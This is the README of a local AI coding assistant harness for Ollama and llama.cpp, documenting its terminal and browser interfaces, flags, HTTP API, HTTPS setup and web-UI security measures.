# momo-coding-harness

A local AI coding assistant that connects to a running [Ollama](https://ollama.com) or [llama.cpp](https://github.com/ggml-org/llama.cpp) server. It runs in your terminal as a split-pane TUI and can read, edit, and manage files in your project via tool calls.

## Requirements

- Python 3.14+ (uses `/opt/homebrew/bin/python3.14` by default)
- One of:
  - A running **Ollama** instance with at least one tool-calling capable model (e.g. `qwen3.5:9b`, `qwen2.5-coder`, `mistral-nemo`), or
  - A running **llama.cpp** server with Jinja chat templates enabled (required for tool calling), e.g. `llama-server -m model.gguf -c 8192 --port 8080`. Current builds enable Jinja by default; on older builds add `--jinja`, and never start it with `--no-jinja`. The default `--reasoning-format auto` already returns the model's reasoning separately, so it shows as thinking output; with `none`, it is recovered from `<think>` tags instead.

## Setup

```bash
/opt/homebrew/bin/python3.14 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

**No third-party package is required.** The TUI (`curses`), the web UI (`http.server`) and the Ollama and llama.cpp clients (`http.client`) all use the Python standard library, so momo runs in a virtualenv with nothing installed. `requirements.txt` only adds optional features (about 22 MB):

| Package | Adds | Without it |
|---|---|---|
| `tree-sitter` + grammar wheels | Code navigation tools and the code index | Those tools are not offered |
| `pypdf` | PDF attachments in the web UI | PDFs are rejected; text files still work |

`--web-tls auto` additionally uses the `openssl` command, which macOS and Linux ship.

Talking to the model server needs no client library either. Both backends are reached over plain HTTP(S): HTTPS servers are verified against the system certificate store, and proxy environment variables are not used for the model connection (use an SSH tunnel for a server behind a proxy or jump host). For Ollama, `OLLAMA_API_KEY` is used as the Bearer token when none is set with `/token`.

## Running

```bash
python momo-coding-harness.py
```

Options:

| Flag | Default | Description |
|---|---|---|
| `--provider` | last-used or `ollama` | LLM backend: `ollama` or `llamacpp` |
| `--host` | `11434` (ollama) / `8080` (llamacpp) | Backend base URL |
| `--model` | `qwen3.5:9b` | Model name (llama.cpp serves whatever model it was launched with) |
| `--workspace` / `--workdir` | `.` (current directory) | Root for all file operations |
| `--context` | auto-detected | Override context token limit (default: half the model's maximum) |
| `--mode` | `design` | Starting mode (`design`, `chat`, `plan`, `coding`, or `momo`) |
| `--max-tool-result` | `0` (unlimited) | Max chars returned by a single tool call |
| `--run-mode` | last `/run-mode`, else `new` | `new`: `run_command` saves its output to a log and returns a view of it; `classic`: returns all of it (see [Command output](#command-output)) |
| `--run-output-limit` | last setting, else `5000` | Characters in `run_command`'s default view in run mode `new` |
| `--no-think` | off | Disable model thinking/reasoning mode (on by default) |
| `--no-stream` | off | Wait for complete replies instead of streaming them as they are generated (streaming is on by default, in the TUI and the web UI) |
| `--web` / `--no-web` | on | Serve the browser chat UI alongside the TUI |
| `--web-host` | `127.0.0.1` | Interface for the web UI (a non-loopback host requires an access token) |
| `--web-port` | `8765` | Port for the web UI |
| `--web-token` | generated off-loopback | Access token for the web UI |
| `--web-tls` | `off` | `auto`: serve the web UI over HTTPS with momo's own local CA (needs the `openssl` command, see [HTTPS](#https)) |
| `--web-cert` / `--web-key` | — | Serve the web UI over HTTPS with your own certificate |
| `--web-insecure` | off | Plain HTTP **without** an access token, even off loopback (trusted networks only) |
| `--headless` | off | Run only the web UI, without the terminal UI |

The chosen provider is saved and reused on the next launch (and restored per session). The status bar shows the active backend as `VIA: <provider>`.

Example targeting a specific project and remote Ollama instance:

```bash
python momo-coding-harness.py --workdir ~/projects/myapp --model qwen3-coder:30b --host http://192.168.1.10:11434
```

Example targeting a local llama.cpp server:

```bash
python momo-coding-harness.py --provider llamacpp --host http://localhost:8080 --workdir ~/projects/myapp
```

## Connecting to a remote Ollama host

If your Ollama instance is hosted remotely and protected by an API key, set the host and token once the harness is running:

```
/host https://my-remote-ollama.example.com
/token sk-your-api-key-here
```

The token is sent as a `Authorization: Bearer <token>` header on every request.

**Security notes:**

- The token is **never written to disk** — it is not saved to the session JSON, the log file, or the input history. It disappears when the harness exits.
- When you type `/token <key>`, the key is masked in the chat display immediately: only the first 2 and last 3 characters are shown (e.g. `sk***ere`). The raw value is never displayed or echoed.
- The **host** *is* saved in the session, so it is restored automatically when the harness restarts and reloads your last session. Only the token must be re-entered (because it is never persisted); add a shell alias or a startup `/token` step if you connect to the same authenticated remote frequently.
- `/token` with no argument shows the current masked token (or "not set").
- `/clear-token` removes the token for the current session.

## Web UI

Besides the terminal UI, the harness serves a browser chat window that can do everything the TUI can. It starts automatically at <http://127.0.0.1:8765>, and its URL is printed as a `[system]` line in the TUI chat pane.

The web UI has **no external dependencies**. It is plain HTML/CSS/JavaScript served by Python's standard-library HTTP server, with no CDN scripts or web fonts and no build step. It works fully offline.

### Starting and stopping

| Command | Result |
|---|---|
| `python momo-coding-harness.py` | TUI **and** web UI (default) |
| `python momo-coding-harness.py --no-web` | TUI only, no server |
| `python momo-coding-harness.py --headless` | Web UI only, no TUI. Prints the URL. Ctrl+C (or SIGTERM) saves the session and stops |
| `python momo-coding-harness.py --web-port 9000` | Serve on another port |
| `python momo-coding-harness.py --web-host 0.0.0.0` | Reachable from other machines. Requires an access token (see [Security](#security)) |

| Flag | Default | Description |
|---|---|---|
| `--web` / `--no-web` | on | Serve the web UI alongside the TUI |
| `--web-host` | `127.0.0.1` | Interface to bind. Any non-loopback host requires an access token |
| `--web-port` | `8765` | Port to listen on |
| `--web-token` | generated when needed | Use a fixed access token instead of a random one |
| `--web-tls auto` | off | HTTPS with momo's own local CA; `--web-tls-name NAME` adds a name or IP to the certificate |
| `--web-cert PEM` / `--web-key PEM` | — | HTTPS with your own certificate (the key may be inside the certificate file) |
| `--web-insecure` | off | Plain HTTP without a token; `--web-allow-host NAME` adds a name the Host check accepts |
| `--headless` | off | Run the web UI without the terminal UI |

If the port is already in use, the TUI still starts and shows `Web UI failed to start on …` in the chat pane. In `--headless` mode the harness exits with an error.

### One session, two windows

The browser and the terminal are two views of **the same session**, not separate conversations:

- A message typed in either window appears in both, and so do the model's replies, tool calls, diffs and command output.
- While the model works, both windows show it as busy. A message sent from either one while busy gets the usual `Busy — waiting for response...` reply.
- A question from the model (`ask_user`, a `run_command` confirmation, plan approval, or a `[y/N]` prompt from a command) can be answered from **either** window.
- Mode, model, host, context usage and plan progress are shared, so a change in one window shows up in the other.
- **View options are per window.** Hiding thinking output in the browser doesn't hide it in the TUI, and vice versa. The browser remembers its view options between visits (in `localStorage`).
- When a page is opened or reloaded, it replays the conversation so far. Loading a session with `/session <name>` from either window refreshes both.

### Layout

```
┌──────────────────────────────────────────────────────────────────────────┐
│ [◷][▭] ● momo  [ coding ▾ ]  exec 2/5  qwen3.5:9b ▾  ollama@localhost [≡]│  ← status bar
│ ~/projects/myapp                     CTX ▓▓▓▓▓▓░░░░ 58%   RUN: confirm   │
├──────────────────────────────────────────────────────────────────────────┤
│                              ┌───────────────────────────────────────┐   │
│                              │ add a --verbose flag to main.py       │   │  ← your message
│                              └───────────────────────────────────────┘   │
│  ▸ thinking (412 words)                                                  │  ← click to expand
│  I'll look at the argument parser first.                   [Copy]        │  ← reply (markdown)
│  ▶ read_file  path="main.py"                               ✓ 82 lines    │  ← click for args + result
│  ± main.py  (+2 −0)                                                      │  ← edit diff
│  │ 38 38 │     parser.add_argument("--no-think", ...)                  │ │
│  │    39 │ +   parser.add_argument("--verbose", action="store_true")   │ │
│  ┌─ ? momo asks ─────────────────────────────────────────────────────┐  │
│  │ Run this command? … $ pytest -q             [ Yes (y) ]  [ No ]   │  │  ← question card
│  └───────────────────────────────────────────────────────────────────┘  │
├──────────────────────────────────────────────────────────────────────────┤
│   /\   \  < mew~                                                         │  ← momo companion
│ ┌──────────────────────────────────────────────────────────────────────┐ │
│ ◷ also update the README                                   ✎ ×          │  ← queued while busy
│ │ Message momo…  (/ commands · @ files)                                │ │  ← input box
│ └──────────────────────────────────────────────────────────────────────┘ │
│ ⠋ thinking                                          [■ Stop] [Send ↵]    │
└──────────────────────────────────────────────────────────────────────────┘
```

- **Status bar**
  - **Sessions** (clock icon) opens the [session drawer](#sessions) and **Workspace files** (folder icon) opens the [workspace browser](#workspace-files).
  - The **connection dot** is green while the page is connected to the harness and red while it reconnects. It reconnects on its own after a harness restart.
  - The **mode picker** switches between design, chat, plan, coding and momo, like `/design`, `/code` and so on, or Shift+Tab.
  - **Plan progress** (e.g. `exec 2/5`, `awaiting approval`) appears in plan mode. Clicking it, or the **Plan** button, opens the plan drawer.
  - Clicking the **model name** opens a model picker listing the models on the backend, like `/model`. llama.cpp serves a single model, so there the list is informational.
  - Also shown: provider@host and the working directory. The working directory is shortened from the front on narrow windows.
  - The **CTX meter** turns yellow at ≥ 75% and red at ≥ 90%, as in the TUI.
  - The **`RUN: auto` / `RUN: confirm`** badge toggles `run_command` confirmation (`/run-confirm`). A **`TOOLS: off`** badge appears when tools are disabled. Click it to turn them back on. A **`NET: on`** / **`NET: local`** badge appears when internet access is on; click it to turn it off. Both are also in View → Network. The **`INDEX`** badge shows the [code index](#code-index): `off`, build progress (`building 812/1873`), or files and memory against the budget (`312 files · 4MB/100MB`). While the index is off, clicking it turns it on. While it is on, clicking it opens a popover like the CTX one: a meter of memory against the budget, a stacked bar and one row per part of the index (file records, definitions, imports, identifiers, text signatures), the same split per language, and Rebuild / Save now / Turn off. It turns yellow when the index is over its memory budget and has dropped a part.
  - **View options** (sliders icon, far right) opens the view options (below).
- **Conversation**
  - Replies **stream in** as they're generated, with a blinking cursor. Reasoning streams into an open *thinking…* block that folds away once the answer starts. When the reply is complete, it's re-rendered as markdown. Use `--no-stream` to turn streaming off.
  - Your messages are right-aligned bubbles. Replies are rendered as markdown: headings, lists, task lists, tables, code blocks, quotes and links. `[system]` lines and errors are monospace. Wide tables keep readable column widths and scroll sideways in their own box, with edge shadows showing there's more.
  - **Code blocks** show their language (e.g. `python`) in the top-left and a **Copy** button in the top-right, in replies and in the plan drawer. The button copies the block's exact contents to *your browser's* clipboard and briefly shows **Copied ✓**. It is faint until you hover over the block or reach it with Tab, and always fully visible on touch screens. It also works when the page is opened over plain HTTP from another machine (`--web-host 0.0.0.0`), where browsers block the modern clipboard API.
  - **Thinking** blocks are collapsed to a `▸ thinking (N words)` line. Click to read them.
  - **Tool calls** are one line each, with name, key arguments and outcome (`✓ 82 lines`, `✗ error`, `applied`). Click to see the full arguments and the result, which shows its first 20 lines with a *show all* link. Failed calls open automatically.
  - **Edit diffs** show the old and new line-number gutter with added lines in green, removed in red and hunks in cyan, in compact or git style. They are capped at 40 lines with a *show more* link.
  - **Question cards** highlight the model's questions. Yes/No questions get **Yes (y)** / **No** buttons. Anything else, such as feedback on a plan, is typed into the input box. Once answered, the card shows the answer.
  - **Message actions** appear on hover, and are always visible on touch screens. Every reply has **Copy**, which copies the reply as Markdown. Your last message has **↻ Retry** and **✎ Edit**:
    - **Retry** sends the same message again and replaces the reply it got. Attachments are included.
    - **Edit** puts the typed text back into the input box, shown with an *Editing your last message* banner. Enter sends the edited version, and the original attachments are kept. ✕ or Esc cancels.
    - Both drop the old reply, and everything after it, from the conversation the model sees. They aren't offered while the model is working or a plan is executing, nor on answers to questions or on `/commands`. The TUI has `/retry`.
  - When you've scrolled up, new messages don't pull you down. A **↓ New messages** button appears instead. Long replies are shown from their beginning.
- **Plan drawer** shows the current plan with its checklist and **Run**, **Resume** and **Cancel plan** buttons, which send `/plan run`, `/plan resume` and `/plan cancel`.
- **Input box**
  - It grows with its content. Text starting with `/` is highlighted as a command.
  - Typing `/` opens **command autocomplete** with the usage and description of every slash command. Use ↑/↓ to pick one and Tab or Enter to insert it.
  - Typing `@` followed by part of a file name opens **path autocomplete**, a fuzzy search over the workspace. Picking a file inserts its path, e.g. `` `src/app/main.py` ``. Only the path is inserted: the model reads the file itself with its tools. To send the contents, attach the file instead.
  - Messages sent **while the model is working** are queued instead of rejected. They appear as queued chips (clock icon) above the input and are sent one per turn once the model is done. The pencil moves a queued message back into the input box and × removes it. `/commands` still run immediately, and while the model is waiting for your answer, what you type is the answer.
  - The placeholder changes to `Answer momo…` when the model is waiting for your reply.
  - A spinner and a **■ Stop** button appear while the model is working.
  - The **paperclip** button attaches files (see [Attaching files](#attaching-files)).
- **momo companion** walks along the top of the input box, with the same frames and mode-specific speech as in the TUI. It is hidden on narrow screens.

The layout adapts to phone-width screens: the status bar collapses to mode, CTX and the view-options button. It follows the system light or dark theme.

All buttons use one set of built-in line icons, drawn as inline SVG rather than emoji. They're the same size and stroke everywhere and follow the light or dark theme. The icon buttons in the top bar are, from left to right: **Sessions** (clock with arrow), **Workspace files** (folder), then on the right **Plan** (checklist, only while a plan exists) and **View options** (sliders). Hover over any icon button for its name.

### Attaching files

Click the **paperclip** button next to the input box, drag files anywhere onto the page, or paste them (e.g. copied in Finder) into the input box. Each file becomes a chip above the input and is sent with your next message when you press Enter. You can send files without typing anything.

- **Text-based files**, such as source code, JSON, CSV, XML, YAML, Markdown and logs, are included as text. UTF-8 is expected. UTF-16/32 files with a byte-order mark and legacy Windows-1252 text are converted too.
- **PDFs** are converted to plain text on the machine running the harness, with a `[page N]` marker before each page. This needs the `pypdf` package (in `requirements.txt`). Scanned PDFs that contain only images have no text to extract and are rejected with a message.
- **Binary files** such as images, archives and executables are rejected.
- Conversion starts as soon as a file is picked. Each chip shows its size, page count and an estimated token count, and turns amber when the file would take more than a quarter of the context window. Use ✕ to remove a file before sending.
- Limits: 25 MB per file, and at most 1,000,000 characters of text per file (the rest is cut off, and the chip says *truncated*).

The model receives the full content, wrapped in `<attachment name="…" chars="…">…</attachment>` blocks after your text. The conversation, in both the browser and the TUI, shows a compact `📎 data.csv (1,234 chars)` line instead. Only the typed text goes into the input history. Attachments can't be combined with a `/command`: they stay queued until the next message. They also work when answering a question from the model.

### Sessions

The **Sessions** button (clock icon, top left) opens the session drawer. It lists the 50 most recent saved sessions, each with its first message, mode, model, message count and age. The current one is highlighted.

- Click a session to load it in both windows, like `/session <name>`.
- **+ New** saves the current session and starts an empty one, like the new `/new` command, which also works in the TUI. Model, host and mode stay the same.
- Neither is possible while the model is working.
- **Delete** a session with the trash button that appears when you hover over it (always visible on touch screens), then confirm. To delete several, click **Select**, tick them (or **Select all**) and click **Delete**. Its `.json` file and its `.log` are both removed. This can't be undone.
- The session that is open can't be deleted: it has no trash button and can't be selected. Start a **+ New** one first, or load another.

### Workspace files

The **Workspace files** button (folder icon, top left) opens a read-only browser of the workspace (the `--workdir`). Folders expand as you click them. Build and dependency folders such as `.git`, `.venv`, `node_modules` and `dist` are left out, and hidden files are shown only with the *hidden files* checkbox.

Clicking a file opens a preview with line numbers and syntax highlighting. PDFs are shown as their extracted text. From the preview you can:
- **Attach** the file to your next message, exactly like uploading it
- **Insert path** into the input box
- **Copy** the contents

The browser can't leave the workspace: `..` paths and symlinks pointing outside are refused. Files over 5 MB aren't previewed, and binary files show an error.

### Syntax highlighting

Code blocks in replies, and files in the workspace preview, are colour-highlighted in both light and dark themes. Supported: Python, JavaScript/TypeScript, JSON, shell, Java, Kotlin, C/C++, Rust, Go, SQL, YAML, TOML, HTML/XML, CSS, diffs and Markdown headings, plus common aliases such as `py`, `ts`, `sh`, `yml` and `cpp`. Blocks without a language are highlighted only when they're obviously JSON or a shell session (`$ …`). The highlighter is built in, with no external libraries. The **Copy** button always copies the plain code.

### Notifications

The view options have two independent switches under **Notifications**: **Play a sound** and **Desktop notification**. Both fire on the same two moments:

- **momo needs an answer** — a question from the `ask_user` tool, a `run_command` permission prompt (`/run-confirm on`), a plan waiting for approval, or a `[y/N]` confirmation from a command. The sound is a kitten mew that rises at the end, like a question.
- **the turn is over** — for turns longer than 2 seconds, so command echoes stay quiet. The mew falls, and the notification body is the first line of the reply.

They differ in *when* they apply, which is the part worth knowing:

- **Play a sound** always plays, whether or not the momo window has focus. A focused window doesn't mean you're looking at it, and being told without having to look is the point of a cue you can hear.
- **Desktop notification** only fires while the window is **away** — minimised, on another tab, or simply not the focused window. That last case matters: a browser sitting open beside your editor counts as away. Notifying about the window you're already staring at would just be noise. Clicking a notification brings the window back.

Even with both switches off, the window title shows **(•)** while there is unseen activity in an away window, and clears when you come back.

The browser asks permission the first time you tick **Desktop notification**. Desktop notifications need a secure origin, which `http://127.0.0.1` and `http://localhost` are — but a LAN address served over plain HTTP (`--web-host 0.0.0.0`) is not, and the browser withholds the API entirely there. An SSH tunnel keeps the origin `localhost` and so keeps notifications working, and so does [HTTPS](#https) with a certificate the device trusts. The sound has no such restriction and works over any origin.

### View options

| Option | TUI equivalent | Effect |
|---|---|---|
| Tool output | `/tool-output on\|off` | Off: each tool call becomes one abbreviated line with no result |
| Thinking | `/think-output on\|off`, Shift+T | Show or hide thinking blocks |
| Markdown | `/markdown on\|off`, Shift+M | Rendered markdown or plain text for replies |
| Edit diffs | `/diff on\|off`, Shift+D | Show or hide diffs of file edits |
| Companion | `/companion on\|off`, Shift+Q | Show or hide momo |
| Idle recap | `/companion-idle-recap on\|off\|<secs>` | View → Companion: a checkbox and the idle time. Shared with the TUI |
| Diff style | `/diff-style compact\|git` | Compact `± path (+N −M)` header, or `diff --git` / `---` / `+++` headers |
| Thinking mode | `/think on\|off` | Whether the **model** reasons before answering. Unlike the display toggles above, this is shared with the TUI |
| Skills | `/load-skill`, `/unload-skill` | One checkbox per skill in `skills/`. Shared with the TUI |
| Command output | `/run-mode`, `/run-output-limit` | View → Context: save command output to a log and return a view, and the view's size in characters. Shared with the TUI |
| Code index | `/index on\|off`, `/index-persist`, `/index-max-mem`, `/index-max-files`, `/index-workers`, `/index-filter`, `/index save\|load` | View → Code index: the toggle, save/load to disk, the memory budget, the file limit, build workers, Save now / Load, and Filter… (edit which files are indexed). Shared with the TUI |
| Play a sound | — | An audible cue (a synthesised kitten mew), focused or not, see [Notifications](#notifications) |
| Desktop notification | — | An OS notification while the window is away, see [Notifications](#notifications) |
| Download conversation | `/export` | Downloads the conversation as a Markdown file to your browser. `/export` writes into the workspace instead |

Typing the TUI command in the browser (e.g. `/think-output off`) has the same effect as the menu.

### Keyboard shortcuts

| Key | Where | Action |
|---|---|---|
| Enter | input box | Send (with any attached files) |
| Cmd/Ctrl+V | input box | Paste copied files as attachments |
| Shift+Enter | input box | New line |
| ↑ / ↓ | input box, cursor at start / end | Previous / next entry in the input history (shared with the TUI) |
| / | input box | Open command autocomplete (↑/↓ select, Tab or Enter insert, Esc close) |
| @ | input box | Open workspace path autocomplete |
| Esc | anywhere | Interrupt the running response (as Esc does in the TUI). Also closes menus and drawers, and cancels editing a message |
| Shift+Tab | anywhere | Cycle mode |
| Shift+T / M / D / Q | outside the input box | Toggle thinking / markdown / diffs / companion |
| Shift+P | outside the input box | Toggle `run_command` confirmation |
| Shift+C | outside the input box | Interrupt the running response |

### What differs from the TUI

- `/exit` and `/quit` don't work from the browser. Close the tab, or quit from the terminal (or press Ctrl+C in `--headless` mode).
- `/copy` copies to the clipboard of the machine running the harness, not the browser's. To copy code into your browser's clipboard, use the **Copy** button on a code block.
- `/export` writes into the workspace on the machine running the harness.
- Diffs of file edits are display-only and aren't stored in the session, same as in the TUI. After a restart, an edit shows its plain tool result instead.

### Security

The web UI can do anything the harness can, including editing files and running shell commands in the workspace, so access is locked down:

- **Loopback only by default.** The server binds to `127.0.0.1`, so only your own machine can reach it. Requests whose `Host` header isn't a loopback name are rejected. This stops malicious web pages that point a domain at `127.0.0.1` (DNS rebinding).
- **Same-origin requests only.** Requests that change anything must be JSON and must come from the page itself. Cross-site requests from other pages open in your browser are rejected.
- **Access token off-loopback.** With `--web-host` set to anything else (e.g. `0.0.0.0` or a LAN address), a random token is generated and the URL printed by the harness includes `?token=…`. Opening that URL once swaps the token for an HttpOnly, SameSite=Strict cookie and removes it from the address bar. Requests without it get `401 Unauthorized`. Use `--web-token` to choose a fixed token. Scripts can send it as `Authorization: Bearer <token>`.
- Traffic is plain HTTP unless you turn on [HTTPS](#https). An SSH tunnel (`ssh -L 8765:127.0.0.1:8765 host`) is the simplest way to reach a remote harness without opening it up.
- **`--web-insecure`** serves plain HTTP with **no token** on a non-loopback address. Anyone who can reach it can read the conversation and run commands as you, so use it only on a network you fully trust. The Host check stays on and accepts only this machine's own names and addresses (plus `--web-allow-host`), so a web page you visit still can't reach it through DNS rebinding.

### HTTPS

| Option | What you do | Best for |
|---|---|---|
| SSH tunnel | `ssh -L 8765:127.0.0.1:8765 host`, open `http://localhost:8765` | Reaching your own machine; SSH encrypts, `localhost` counts as secure |
| `--web-tls auto` | momo makes its own local CA and certificate | Other devices on your LAN, nothing else to install |
| `--web-cert` / `--web-key` | Bring a certificate (mkcert, Let's Encrypt, `tailscale cert`, …) | You already have one |
| Reverse proxy | Caddy or nginx in front of momo | A public domain name with automatic certificates |

HTTPS never replaces the token: off loopback it is still required.

**`--web-tls auto`** works like a small mkcert and needs only the `openssl` command (macOS's built-in LibreSSL works):

```bash
python momo-coding-harness.py --web-host 0.0.0.0 --web-tls auto
# Web UI: https://my-mac.local:8765/?token=…
# HTTPS: trust momo's local CA once per device — ~/.momo-harness/tls/momo-ca.pem
#        (also at https://my-mac.local:8765/momo-ca.pem), SHA-256 97:9A:…
```

1. On first use momo creates a root CA in `~/.momo-harness/tls/` (directory `0700`, keys `0600`) and a server certificate for `localhost`, the hostname, `<hostname>.local` and this machine's LAN addresses. Later starts reuse them; the server certificate is re-issued automatically when those names change or it nears expiry, without a new trust step.
2. Trust the CA **once per device**. The file to trust is `~/.momo-harness/tls/momo-ca.pem` on the machine running momo (see [Where momo stores data](#where-momo-stores-data)): copy it from there, or download it from `/momo-ca.pem` on the running server (no token needed, a CA certificate is public). Compare the SHA-256 fingerprint with the one momo printed. Only ever share `momo-ca.pem`, never `momo-ca.key`:
   - macOS: open it in Keychain Access, then set *When using this certificate* to *Always Trust*
   - iOS / iPadOS: install the profile, then enable it under Settings → General → About → Certificate Trust Settings
   - Android: Settings → Security → Encryption & credentials → Install a certificate → CA certificate
   - Linux: copy to `/usr/local/share/ca-certificates/momo-ca.crt` and run `sudo update-ca-certificates` (Firefox keeps its own store: Settings → Certificates → Import)
   - Windows: open it and install into *Trusted Root Certification Authorities*
3. Open the printed URL. Without step 2 the connection is still encrypted, but each browser shows a certificate warning.

The CA carries X.509 **name constraints**: it can only vouch for `localhost`, `*.local`, this host's name, loopback and private addresses (including Tailscale's `100.64.0.0/10`), and names passed with `--web-tls-name` when it was created. A device that trusts it can't be tricked into accepting a certificate for a public site, even if `momo-ca.key` leaks. Still keep that key private. A name outside the constraints later is refused with instructions: delete `momo-ca.pem`/`momo-ca.key` to make a new CA (every device must trust it again), or use your own certificate.

**Reverse proxy.** Keep momo on loopback but give it a fixed token, which turns on token mode and so lets the proxy pass its own `Host` header:

```bash
python momo-coding-harness.py --web-host 127.0.0.1 --web-token "$(openssl rand -hex 16)"
```

```
momo.example.com {                 # Caddy: certificates and SSE streaming handled
    reverse_proxy 127.0.0.1:8765
}
```

```nginx
location / {
    proxy_pass http://127.0.0.1:8765;
    proxy_set_header Host $host;   # the Origin check compares against it
    proxy_buffering off;           # /api/events is Server-Sent Events
    proxy_read_timeout 1h;
}
```

Then open `https://momo.example.com/?token=<token>` once. Never make the proxy strip the `Origin` header: a missing Origin passes the same-origin check, so every website could then post to momo.
- `/token` values typed in the browser are masked in both windows and never added to the history, exactly as in the TUI.

### HTTP API

The page talks to the harness through a small JSON API, which can also be scripted, e.g. with `curl`:

| Endpoint | Description |
|---|---|
| `GET /api/state` | Snapshot: status fields, busy/waiting flags, modes, slash commands, skills, the current plan, input history |
| `GET /api/events` | Server-Sent Events stream. It replays the conversation, then streams live events (`user`, `chat`, `think`, `tool_call`, `tool_result`, `diff`, `ask_user`, `status`, `busy`, `done`, `error`, `reset`, plus the live-only `delta` / `stream_end` while a reply streams) as JSON |
| `POST /api/submit` `{"text": "..."}` | Exactly like typing in the input box: a message, a `/command`, or an answer to a pending question. Optional `"attachments": [{"name", "text"}]` adds files. Returns the view changes the command requested |
| `POST /api/cancel` | Interrupt the running response |
| `POST /api/mode` `{"mode": "coding"}` | Switch mode |
| `POST /api/retry` | Re-send the last user message (like `/retry`) |
| `POST /api/edit` `{"text": "..."}` | Replace the typed part of the last user message, keep its attachments, and re-send |
| `GET /api/last-user` | The last user message's typed text and attachment names |
| `GET /api/sessions` | Recent sessions: `{current, sessions: [{name, mtime, mode, model, provider, workdir, messages, preview}]}` |
| `GET /api/models` | `{current, models, can_switch, provider}` |
| `POST /api/sessions/delete` `{"names": [...]}` | Delete saved sessions (and their logs) by name. Returns `{deleted, skipped: [{name, reason}]}`; the current session and anything that isn't a plain session name are skipped |
| `GET /api/export` | The conversation as a Markdown download |
| `GET /api/files?path=&hidden=0\|1` | Workspace directory listing |
| `GET /api/file?path=` | A workspace file converted to text (same conversion as uploads) |
| `GET /api/files/search?q=` | Fuzzy workspace path search (top 30) |
| `POST /api/upload` | Raw file bytes (`Content-Type: application/octet-stream`, URL-encoded name in `X-Filename`). Returns `{name, text, kind, chars, pages, truncated}`, or `{error}` with status 422 for binary or unreadable files |

```bash
curl -s localhost:8765/api/state | jq .status
curl -s -X POST localhost:8765/api/submit -H 'Content-Type: application/json' -d '{"text": "/context"}'
curl -sN localhost:8765/api/events          # watch the live event stream
```

### Troubleshooting

- **`Web UI failed to start … Address already in use`**: another harness, or another program, is using the port. Pick another with `--web-port`.
- **`403 Forbidden: unexpected Host header`**: open the page via `localhost` or `127.0.0.1`, not a machine name. To use a machine name or LAN address, start with `--web-host <addr>` (token mode).
- **`401 Unauthorized`**: the server runs in token mode. Open the exact URL the harness printed, including `?token=…`.
- **Red connection dot**: the harness isn't running, or it restarted. The page reconnects automatically once it's back.

## TUI Layout

```
┌──────────────────────────────────────────────────────┐
│  Chat pane                                            │
│  [user] describe what the auth module does            │
│  [assistant] The auth module handles...               │
│  ▶ find_files({"pattern":"*.py","directory":"src"})   │
│    → src/auth/login.py                                │
│    → src/auth/tokens.py                               │
│  [thinking]                                           │
│    I should read login.py first...                    │
│  [assistant] I can see the auth module consists of... │
│                                                       │
├──────────────────────────────────────────────────────┤
│  MODE: design | VIA: ollama | MODEL: qwen3.5:9b | HOST: localhost:11434 | CTX: 12% | DIR: .│
├──────────────────────────────────────────────────────┤
│  > _                                                  │
└──────────────────────────────────────────────────────┘
```

- **Chat pane** — conversation history including inline tool calls (yellow), results, and thinking blocks (orange). Scroll with `↑`/`↓` or `PgUp`/`PgDn`.
- **Streaming** — replies appear as they are generated, ending in a `▍` cursor, and are replaced by the fully rendered message when complete. Disable with `--no-stream`.
- **Status bar** — current mode, model, Ollama host, context usage %, and working directory. When the line is too narrow to fit, the working directory is shortened from the front (`…/tail`) so its most specific part stays visible.
  - CTX turns yellow at ≥ 75%, red at ≥ 90%.
  - Shows `⠋ thinking` (spinner) while the model is working.
  - Shows `? waiting for input` when the model has called `ask_user` and is waiting for your reply. Type your answer and press Enter — the model resumes from where it paused.
  - Top rule turns green when the chat pane has focus; bottom rule turns green when the input pane has focus.
- **Input bar** — 5-row multi-line input area. Paste or type multi-line text freely.
  - **Enter** — submit the message.
  - **Ctrl+J** — insert a newline at the cursor without submitting (works in every terminal).
  - **Option+Enter** — also inserts a newline on iTerm2 when Left Option Key is set to "+Esc" (Profiles → Keys), or on Terminal.app with "Use Option as Meta key" enabled.
  - **Shift+Enter** — inserts a newline on terminals with CSI-u mode enabled (iTerm2 → Profiles → Keys → "Report modifiers using CSI u").
  - Multi-line text can always be **pasted** regardless of terminal settings. On terminals with bracketed paste (iTerm2, Terminal.app, kitty, WezTerm, most modern ones) a paste is inserted as-is — tabs, non-ASCII text and a trailing newline included — and never sent until you press Enter.
  - **Esc** — interrupt the running response (also `Shift+C` with the chat pane focused); with a suggestion list open, Esc closes it first.
  - **↑/↓** — move the cursor between lines in multi-line input; at the top or bottom edge, navigates command history.
  - **Shift+↑ / Shift+↓** — navigate command history regardless of cursor position.
  - **Ctrl+Left / Ctrl+Right** — move cursor one word left or right (requires xterm-compatible terminal; also available as **Option+b / Option+f** on macOS with "+Esc" Option key).
  - **Ctrl+A / Home** — move cursor to start of the current line.
  - **Ctrl+E / End** — move cursor to end of the current line.
  - **Ctrl+K** — delete from cursor to end of the current line (kills the newline itself when the cursor is right before one).
  - **Ctrl+U** — delete from start of the current line to the cursor.
  - **@ path autocomplete**: typing `@` followed by part of a file name opens a fuzzy workspace search above the input, the same search the web UI uses. `↑`/`↓` select, `Tab` inserts the first (or highlighted) path, `Enter` inserts a highlighted path (with nothing highlighted it still submits), and `Esc` closes the list. The pick replaces `@query` with `` `path/to/file` ``. While the list is open, `Tab` inserts instead of switching focus.
  - **/ command autocomplete**: typing `/` at the start of the input lists the matching slash commands with their usage and description. It uses the same keys as `@`. A picked command that takes an argument gets a trailing space so you can type the argument.
  - When the model is waiting for input (after `ask_user`), the prefix changes from `›` to `?`.
- **Chat pane scrolling** — `↑`/`↓`, `PgUp`/`PgDn`. When a table or other wide content is present, `←`/`→` scrolls horizontally (chat focus required). While you are scrolled up, new output does not pull the view down; the status line shows `▼ NEW (PgDn)` until you are back at the bottom. Resizing the terminal re-wraps the transcript to the new width.
- **Focus** — Press `Tab` to toggle focus between Chat and Input. The active pane border highlights green.
- **Tool call visibility** — `/tool-output on|off` switches between full tool output and abbreviated mode (first 50 chars + `…`). Argument values are cut to 60 characters either way, as in the web UI; a written file's content shows in the diff.
- **Thinking output** — `[thinking]` blocks show the model's internal reasoning in orange/yellow. Toggle display with `/think-output on|off` or `Shift+T` (when chat focused). Thinking content is never re-injected as context.
- **Markdown rendering** — assistant responses are rendered as formatted markdown by default. Headings use box-drawing decorations, lists use `•`/numbered prefixes, code blocks are prefixed with `│`, tables render with full box-drawing characters. Toggle with `/markdown on|off` or `Shift+M` (when chat focused). When a table is wider than the terminal, a horizontal scrollbar appears at the bottom of the chat pane; scroll it with `←`/`→` while the chat pane is focused.
